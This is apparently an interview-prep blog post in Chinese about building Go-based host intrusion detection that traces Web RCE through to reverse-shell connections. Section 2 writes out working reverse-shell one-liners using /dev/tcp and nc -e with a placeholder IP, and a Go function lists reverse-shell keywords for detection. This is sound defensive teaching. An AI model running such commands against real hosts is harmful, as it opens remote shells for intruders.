---
title: Go主机安全面试：Web RCE到反弹Shell检测
date: 2026-06-30 09:30:10
categories:
- Interview
tags:
- go
- interview
- security
- edr
- hids
---

# Go 主机安全面试：Web RCE 到反弹 Shell 检测

这类题通常会把 Web 漏洞、Linux 进程、网络外连和 EDR 检测串在一起考。面试官更关心你能不能把“一个异常命令”还原成“可解释的攻击链”。

## 岗位场景

```text
攻击入口：Web RCE / WebShell
  -> web 进程执行命令
  -> shell / 脚本解释器启动
  -> 主机向外发起连接
  -> 攻击者获得交互式 shell
  -> 后续可能提权、落地文件、持久化
```

Go 研发要做的事不是写一个万能规则，而是把事件采准、字段对齐、证据留住，并让检测逻辑能稳定跑在线上 Agent 或服务端。

## 1. 如何判断一个进程可能来自 Web RCE？

> 简答：看父进程、命令行、用户、工作目录和时间关系，不能只看进程名。

常见信号：

- 父进程是 `nginx`、`apache2`、`php-fpm`、`tomcat`、`java` 等 Web 服务。
- 子进程是 `sh`、`bash`、`python`、`perl`、`curl`、`wget`、`nc`。
- 命令行包含下载、解码、管道、重定向、反弹 shell 片段。
- 运行用户是 `www-data`、`nginx`、`apache` 等低权限 Web 用户。

Go 落地要点：

- 采集进程启动事件时保留 `pid`、`ppid`、`cmdline`、`cwd`、`uid`。
- 进程退出很快时，优先从事件源拿字段；`/proc` 只能作为补充。
- 检测函数先做小而明确的条件组合，方便测试和解释。

## 2. 反弹 shell 的高频特征有哪些？

> 简答：本机启动 shell 或解释器，并主动连接外部地址，把输入输出绑定到网络连接。

典型片段：

```text
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
nc -e /bin/sh 1.2.3.4 4444
python -c 'import socket,subprocess,os; ...'
```

关键知识点：

- 反弹 shell 是“主机主动外连”，比入站连接更容易绕过边界防火墙。
- 单独看到 `bash` 不等于攻击，必须结合父进程和网络行为。
- `curl|sh`、base64 解码执行、`mkfifo` 管道也常见。

Go 实现要点：

```go
func LooksLikeReverseShell(cmd string) bool {
    c := strings.ToLower(cmd)
    return strings.Contains(c, "/dev/tcp/") ||
        strings.Contains(c, "nc -e") ||
        strings.Contains(c, "bash -i") ||
        strings.Contains(c, "socket")
}
```

这只是第一层粗筛，真正告警还要叠加外连、父进程和用户上下文。

## 3. 为什么不能只用正则匹配命令行？

> 简答：命令行容易混淆，正则容易误报和漏报，检测需要行为上下文。

攻击者会做这些处理：

- 空格、引号、变量替换混淆。
- base64、hex、URL 编码。
- 通过 `sh -c`、管道、临时文件间接执行。
- 使用 `python`、`perl`、`awk` 等解释器实现 socket 连接。

Go 设计要点：

- 命令行匹配用于候选筛选，不作为唯一证据。
- 标准化时保留原始命令行和归一化命令行。
- 对命中规则记录证据字段，例如 `matched_field=process.cmdline`。

## 4. 如何把进程事件和网络事件关联起来？

> 简答：用 `host_id + pid + start_time + time_window` 做短时间窗口关联。

关联链路：

```text
process_start(pid=1200, ppid=300, cmd="bash -i")
  + network_connect(pid=1200, dst_ip=1.2.3.4, dst_port=4444)
  + parent_process(name="php-fpm")
  => Web RCE 反弹 shell 高危告警
```

关键知识点：

- 只用 PID 不够，Linux PID 会复用。
- 进程启动时间能降低 PID 复用导致的误关联。
- Agent 端适合做短窗口关联，长时间攻击链适合服务端做。

Go 落地要点：

- 内存缓存设置 TTL，避免常驻 Agent 内存无限增长。
- key 中加入进程启动时间或事件时间。
- 关联失败也要保留单点事件，供服务端二次分析。

## 5. 如何降低这类规则的误报？

> 简答：用多条件分级，不要把所有命中都打成高危。

误报来源：

- 运维脚本远程拉取文件。
- CI/CD 执行 shell。
- 安全扫描器或自检脚本。
- 合法 Web 管理后台触发命令。

降噪策略：

| 条件 | 风险变化 |
| --- | --- |
| Web 父进程启动 shell | 中风险 |
| shell 同时外连公网 IP | 高风险 |
| 命令行命中 `/dev/tcp` 或 `nc -e` | 高风险 |
| 命中可信脚本路径或签名 | 降级或忽略 |

Go 实现要点：

- 规则输出 `severity` 和 `reason`，不要只返回 `bool`。
- 白名单要记录命中原因，便于审计。
- 去重 key 可以用 `host_id + rule_id + parent + cmd_hash + dst_ip`。

## 6. Agent 采集这类事件时如何控制资源？

> 简答：只采关键事件，批量上报，队列满时可控降级。

设计重点：

- 进程启动、网络连接优先级高于周期性全量扫描。
- channel 要有容量上限，避免异常风暴打爆内存。
- 批量上报控制大小和超时。
- 低价值事件丢弃时记录计数指标。

Go 常见追问：

- `context.Context` 如何停止采集 goroutine？
- channel 满了阻塞还是丢弃？
- 如何定位 Agent CPU 飙高？
- 如何用 `pprof` 看 goroutine 泄漏？

## 7. Linux 上有哪些采集来源可选？

> 简答：`procfs` 简单但容易漏，audit 事件完整度较好，eBPF 实时性强但兼容成本更高。

| 来源 | 适合用途 | 主要问题 |
| --- | --- | --- |
| procfs | 补充进程上下文 | 短生命周期进程容易错过 |
| audit | 进程、文件、网络审计 | 配置和性能要评估 |
| eBPF | 实时捕获系统调用 | 内核版本、权限、兼容性 |
| netlink | 网络和进程相关通知 | 场景有限，仍需补上下文 |

面试回答可以这样收口：

```text
生产上通常组合采集：
eBPF/audit 负责实时事件
procfs 负责补充上下文
服务端负责长期关联和查询
```

## 8. 如果客户反馈误报，你如何定位？

> 简答：先看证据链，再复现规则条件，最后判断是规则问题、白名单问题还是采集脏数据。

排查顺序：

1. 看告警命中的规则版本和证据字段。
2. 看父子进程、命令行、用户、外连 IP。
3. 查同主机同时间段是否有下载、落地、提权、持久化事件。
4. 对比客户业务脚本路径和执行计划。
5. 如果是误报，补上下文条件或白名单，不要直接删规则。

Go 研发要点：

- 告警结构里保存 `rule_id`、`rule_version`、`evidence`。
- 规则变更要可回放，用历史事件验证误报和漏报。
- 日志要能定位采集丢字段、规则异常和上报失败。

## 学习要点

- Linux 进程模型：PID、PPID、进程组、启动时间、用户权限。
- `/proc/<pid>/cmdline`、`/proc/<pid>/status`、`/proc/<pid>/fd` 的基本含义。
- 常见反弹 shell 命令和 Web RCE 利用链路。
- Go 并发控制：`context`、channel、批量上报、超时。
- 检测工程：证据字段、规则版本、误报降噪、攻击链还原。

## 小练习

1. 写一个 `RiskScore(event)`，根据父进程、命令行、外连 IP 输出低/中/高风险。
2. 给 `LooksLikeReverseShell` 补 3 个测试用例：正常 bash、`/dev/tcp`、`nc -e`。
3. 设计一个告警 JSON，要求能说明“为什么这条告警被命中”。
4. 思考：如果进程已经退出，哪些字段必须在启动事件里立即采集？
